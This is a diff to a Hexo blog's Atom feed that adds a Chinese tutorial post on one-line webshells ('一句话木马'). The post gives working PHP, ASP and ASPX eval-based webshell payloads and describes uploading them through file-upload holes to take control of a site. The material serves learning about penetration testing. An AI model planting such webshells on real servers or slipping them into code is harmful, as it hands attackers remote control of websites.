@@ -6,7 +6,7 @@
   <link href="http://ymmmmmmin.github.io.git/atom.xml" rel="self"/>
   
   <link href="http://ymmmmmmin.github.io.git/"/>
-  <updated>2022-01-25T05:55:31.513Z</updated>
+  <updated>2022-01-27T15:35:12.587Z</updated>
   <id>http://ymmmmmmin.github.io.git/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Web安全-一句话木马</title>
+    <link href="http://ymmmmmmin.github.io.git/2022/01/27/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
+    <id>http://ymmmmmmin.github.io.git/2022/01/27/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
+    <published>2022-01-27T12:01:45.000Z</published>
+    <updated>2022-01-27T15:35:12.587Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><p>在渗透过程中，我们会经常用到上传一句话木马 (webshell) 到目前的web服务目录获取系统权限，不论asp、php、jsp、aspx都是如此，那么一句话木马到底是什么呢？</p><span id="more"></span><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>利用文件上传漏洞，往目标网站上传一句话木马，然后你就可以在本地通过中国菜刀（chopper.exe）即可获取和控制整个网站的目录。</p><p>先来看一句最简单的php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这句php一句话木马，第一眼看就知道密码是root，通过post提交数据，但是具体怎么执行的呢下面我们就详细分析一下这句话是如何执行的。</p><h5 id="分析这句话"><a href="#分析这句话" class="headerlink" title="分析这句话"></a>分析这句话</h5><p>1.<?php ?>这是php的语法，代码写在这里面服务器才能认出来是PHP代码并拿去解析；</p><p>2.<strong>@符号</strong>  表示后面即使执行错误也不会报错。</p><p>3.为什么说密码是root呢</p><p>php里面几个超全局变量：$_GET、$_POST 就是其中之一。</p><p><strong>$_POST[‘root’]</strong>   表示从页面中获得root这个参数值。</p><p>$_POST[‘a’]; 的意思就是a这个变量，用post的方法接收。</p><p>4.<strong>eval()函数</strong>  表示括号内的语句字符串等全部都当作php代码执行。</p><h3 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h3><p>只要攻击者满足这三个条件，就能实现成功入侵：</p><p>1.木马上传成功且未被杀</p><p>2.知道木马的路径</p><p>3.上传的木马能正常运行</p><h3 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h3><p>常见的一句话木马有以下形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马：<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">asp的一句话木马：&lt;%<span class="keyword">eval</span> reuqest (<span class="string">&quot;root&quot;</span>)%&gt;</span><br><span class="line">aspx的一句话木马：&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;root&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>我们可以直接将这些语句插入到网站的某个php/asp/aspx文件中，或者在目录里重新创建一个新的文件写入这些语句，然后上传到网站上即可。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;一句话木马&quot;&gt;&lt;a href=&quot;#一句话木马&quot; class=&quot;headerlink&quot; title=&quot;一句话木马&quot;&gt;&lt;/a&gt;一句话木马&lt;/h1&gt;&lt;p&gt;在渗透过程中，我们会经常用到上传一句话木马 (webshell) 到目前的web服务目录获取系统权限，不论asp、php、jsp、aspx都是如此，那么一句话木马到底是什么呢？&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="一句话木马" scheme="http://ymmmmmmin.github.io.git/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
+    
+    
+    <category term="博客" scheme="http://ymmmmmmin.github.io.git/tags/%E5%8D%9A%E5%AE%A2/"/>
+    
+    <category term="hexo" scheme="http://ymmmmmmin.github.io.git/tags/hexo/"/>
+    
+  </entry>
   
   <entry>
     <title>sqli-labs 5-6</title>
